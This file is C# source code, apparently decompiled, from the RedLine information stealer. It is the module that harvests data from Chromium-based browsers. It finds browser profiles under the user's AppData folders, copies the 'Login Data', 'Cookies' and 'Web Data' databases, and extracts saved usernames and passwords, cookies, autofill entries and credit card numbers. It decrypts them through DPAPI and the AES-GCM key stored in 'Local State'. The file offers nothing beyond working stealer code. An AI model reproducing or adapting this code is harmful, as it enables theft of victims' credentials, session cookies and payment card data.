using RedLine.Client.Logic.Crypto;
using RedLine.Logic.Extensions;
using RedLine.Logic.Helpers;
using RedLine.Logic.SQLite;
using RedLine.Models;
using RedLine.Models.Browsers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace RedLine.Logic.Browsers.Chromium
{
  public static class ChromiumEngine
  {
    public static List<Browser> ParseBrowsers()
    {
      List<Browser> browserProfiles = new List<Browser>();
      try
      {
        int countCompleted = 0;
        object locker = new object();
        List<string> profile = ChromiumEngine.GetProfile();
        foreach (string str1 in profile)
        {
          string rootPath = str1;
          new Thread((ThreadStart) (() =>
          {
            Browser browser = new Browser();
            try
            {
              string fullName = new FileInfo(rootPath).Directory.FullName;
              string str1 = rootPath.Contains(RedLine.Logic.Helpers.Constants.RoamingAppData) ? ChromiumEngine.GetRoamingName(fullName) : ChromiumEngine.GetLocalName(fullName);
              if (!string.IsNullOrEmpty(str1))
              {
                string str2 = str1[0].ToString().ToUpper() + str1.Remove(0, 1);
                string name = ChromiumEngine.GetName(fullName);
                if (!string.IsNullOrEmpty(name))
                {
                  browser.Name = str2;
                  browser.Profile = name;
                  browser.Cookies = (IList<Cookie>) ChromiumEngine.EnumCook(fullName).IsNull<List<Cookie>>();
                  browser.Credentials = (IList<LoginPair>) ChromiumEngine.GetCredentials(fullName).IsNull<List<LoginPair>>();
                  browser.Autofills = (IList<Autofill>) ChromiumEngine.EnumFills(fullName).IsNull<List<Autofill>>();
                  browser.CreditCards = (IList<CreditCard>) ChromiumEngine.EnumCC(fullName).IsNull<List<CreditCard>>();
                }
              }
            }
            catch
            {
            }
            lock (locker)
            {
              IList<Cookie> cookies = browser.Cookies;
              if ((cookies != null ? (cookies.Count > 0 ? 1 : 0) : 0) == 0)
              {
                IList<LoginPair> credentials = browser.Credentials;
                if ((credentials != null ? (credentials.Count > 0 ? 1 : 0) : 0) == 0)
                {
                  IList<CreditCard> creditCards = browser.CreditCards;
                  if ((creditCards != null ? (creditCards.Count > 0 ? 1 : 0) : 0) == 0)
                  {
                    IList<Autofill> autofills = browser.Autofills;
                    if ((autofills != null ? (autofills.Count > 0 ? 1 : 0) : 0) == 0)
                      goto label_11;
                  }
                }
              }
              browserProfiles.Add(browser);
label_11:
              ++countCompleted;
            }
          })).Start();
        }
        while (countCompleted != profile.Count)
          ;
      }
      catch
      {
      }
      return browserProfiles;
    }

    private static List<LoginPair> GetCredentials(string profilePath)
    {
      List<LoginPair> loginPairList = new List<LoginPair>();
      try
      {
        string str = Path.Combine(profilePath, "Login Data");
        if (!File.Exists(str))
          return loginPairList;
        string[] strArray = profilePath.Split(new string[1]{ "\\" }, StringSplitOptions.RemoveEmptyEntries);
        string localStatePath = Path.Combine(string.Join("\\", ((IEnumerable<string>) strArray).Take<string>(strArray.Length - 1).ToArray<string>()), "Local State");
        SqlConnection manager = new SqlConnection(DecryptHelper.CreateTempCopy(str));
        manager.ReadTable("logins");
        for (int row = 0; row < manager.RowLength; ++row)
        {
          LoginPair loginPair = new LoginPair();
          try
          {
            loginPair = ChromiumEngine.ReadData(manager, row, localStatePath);
          }
          catch
          {
          }
          if (loginPair.Login.IsNotNull<string>() && loginPair.Login != "UNKNOWN" && (loginPair.Password != "UNKNOWN" && loginPair.Host != "UNKNOWN"))
            loginPairList.Add(loginPair);
        }
      }
      catch
      {
      }
      return loginPairList;
    }

    private static List<Cookie> EnumCook(string profilePath)
    {
      List<Cookie> cookieList = new List<Cookie>();
      try
      {
        string str = Path.Combine(profilePath, "Cookies");
        if (!File.Exists(str))
          return cookieList;
        string[] strArray = profilePath.Split(new string[1]{ "\\" }, StringSplitOptions.RemoveEmptyEntries);
        string localStatePath = Path.Combine(string.Join("\\", ((IEnumerable<string>) strArray).Take<string>(strArray.Length - 1).ToArray<string>()), "Local State");
        SqlConnection sqlConnection = new SqlConnection(DecryptHelper.CreateTempCopy(str));
        sqlConnection.ReadTable("cookies");
        for (int rowIndex = 0; rowIndex < sqlConnection.RowLength; ++rowIndex)
        {
          Cookie cookie = (Cookie) null;
          try
          {
            cookie = new Cookie()
            {
              Host = sqlConnection.ParseValue(rowIndex, "host_key").Trim(),
              Http = sqlConnection.ParseValue(rowIndex, "httponly") == "1",
              Path = sqlConnection.ParseValue(rowIndex, "path").Trim(),
              Secure = sqlConnection.ParseValue(rowIndex, "secure") == "1",
              Expires = sqlConnection.ParseValue(rowIndex, "expires_utc").Trim(),
              Name = sqlConnection.ParseValue(rowIndex, "name").Trim(),
              Value = ChromiumEngine.DecryptChromium(sqlConnection.ParseValue(rowIndex, "encrypted_value"), localStatePath)
            };
          }
          catch
          {
          }
          if (cookie != null)
            cookieList.Add(cookie);
        }
      }
      catch
      {
      }
      return cookieList;
    }

    private static List<Autofill> EnumFills(string profilePath)
    {
      List<Autofill> autofillList = new List<Autofill>();
      try
      {
        string str = Path.Combine(profilePath, "Web Data");
        if (!File.Exists(str))
          return autofillList;
        SqlConnection sqlConnection = new SqlConnection(DecryptHelper.CreateTempCopy(str));
        sqlConnection.ReadTable("autofill");
        for (int rowIndex = 0; rowIndex < sqlConnection.RowLength; ++rowIndex)
        {
          Autofill autofill = (Autofill) null;
          try
          {
            autofill = new Autofill()
            {
              Name = sqlConnection.ParseValue(rowIndex, "name").Trim(),
              Value = sqlConnection.ParseValue(rowIndex, "value").Trim()
            };
          }
          catch
          {
          }
          if (autofill != null)
            autofillList.Add(autofill);
        }
      }
      catch
      {
      }
      return autofillList;
    }

    private static List<CreditCard> EnumCC(string profilePath)
    {
      List<CreditCard> creditCardList = new List<CreditCard>();
      try
      {
        string str = Path.Combine(profilePath, "Web Data");
        if (!File.Exists(str))
          return creditCardList;
        string[] strArray = profilePath.Split(new string[1]{ "\\" }, StringSplitOptions.RemoveEmptyEntries);
        string localStatePath = Path.Combine(string.Join("\\", ((IEnumerable<string>) strArray).Take<string>(strArray.Length - 1).ToArray<string>()), "Local State");
        SqlConnection sqlConnection = new SqlConnection(DecryptHelper.CreateTempCopy(str));
        sqlConnection.ReadTable("credit_cards");
        for (int rowIndex = 0; rowIndex < sqlConnection.RowLength; ++rowIndex)
        {
          CreditCard creditCard = (CreditCard) null;
          try
          {
            creditCard = new CreditCard()
            {
              Holder = sqlConnection.ParseValue(rowIndex, "name_on_card").Trim(),
              ExpirationMonth = Convert.ToInt32(sqlConnection.ParseValue(rowIndex, "expiration_month").Trim()),
              ExpirationYear = Convert.ToInt32(sqlConnection.ParseValue(rowIndex, "expiration_year").Trim()),
              CardNumber = ChromiumEngine.DecryptChromium(sqlConnection.ParseValue(rowIndex, "card_number_encrypted"), localStatePath)
            };
          }
          catch
          {
          }
          if (creditCard != null)
            creditCardList.Add(creditCard);
        }
      }
      catch
      {
      }
      return creditCardList;
    }

    private static LoginPair ReadData(
      SqlConnection manager,
      int row,
      string localStatePath)
    {
      LoginPair loginPair = new LoginPair();
      try
      {
        loginPair.Host = manager.ParseValue(row, "origin_url").Trim();
        loginPair.Login = manager.ParseValue(row, "username_value").Trim();
        loginPair.Password = ChromiumEngine.DecryptChromium(manager.ParseValue(row, "password_value"), localStatePath);
      }
      catch
      {
      }
      finally
      {
        loginPair.Login = string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login;
        loginPair.Password = string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password;
        loginPair.Host = string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host;
      }
      return loginPair;
    }

    private static string DecryptChromium(string chiperText, string localStatePath)
    {
      string str = string.Empty;
      try
      {
        str = chiperText.StartsWith("v10") ? ChromiumEngine.DecryptV10(localStatePath, chiperText) : DecryptHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser, (byte[]) null).Trim();
      }
      catch
      {
      }
      return str;
    }

    private static string DecryptV10(string localStatePath, string chiperText)
    {
      int length = 12;
      string str1 = "v10";
      string str2 = "DPAPI";
      string empty = string.Empty;
      byte[] key = DecryptHelper.DecryptBlob(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(File.ReadAllText(localStatePath).FromJSON()["os_crypt"]["encrypted_key"].ToString(false))).Substring(str2.Length)), DataProtectionScope.CurrentUser, (byte[]) null);
      byte[] bytes = Encoding.Default.GetBytes(chiperText.Substring(str1.Length, length));
      return AesGcm256.Decrypt(Encoding.Default.GetBytes(chiperText.Substring(length + str1.Length)), key, bytes);
    }

    private static string GetName(string path)
    {
      try
      {
        string[] strArray = path.Split(new char[1]{ '\\' }, StringSplitOptions.RemoveEmptyEntries);
        if (strArray[strArray.Length - 2] == "User Data")
          return strArray[strArray.Length - 1];
      }
      catch
      {
      }
      return "Unknown";
    }

    private static string GetRoamingName(string path)
    {
      try
      {
        return path.Split(new string[1]{ "AppData\\Roaming\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]{ '\\' }, StringSplitOptions.RemoveEmptyEntries)[0];
      }
      catch
      {
      }
      return string.Empty;
    }

    private static string GetLocalName(string path)
    {
      try
      {
        string[] strArray = path.Split(new string[1]{ "AppData\\Local\\" }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]{ '\\' }, StringSplitOptions.RemoveEmptyEntries);
        return strArray[0] + "_[" + strArray[1] + "]";
      }
      catch
      {
      }
      return string.Empty;
    }

    private static List<string> GetProfile()
    {
      List<string> stringList = new List<string>();
      try
      {
        stringList.AddRange((IEnumerable<string>) DecryptHelper.FindPaths(RedLine.Logic.Helpers.Constants.RoamingAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
        stringList.AddRange((IEnumerable<string>) DecryptHelper.FindPaths(RedLine.Logic.Helpers.Constants.LocalAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
      }
      catch
      {
      }
      return stringList;
    }
  }
}
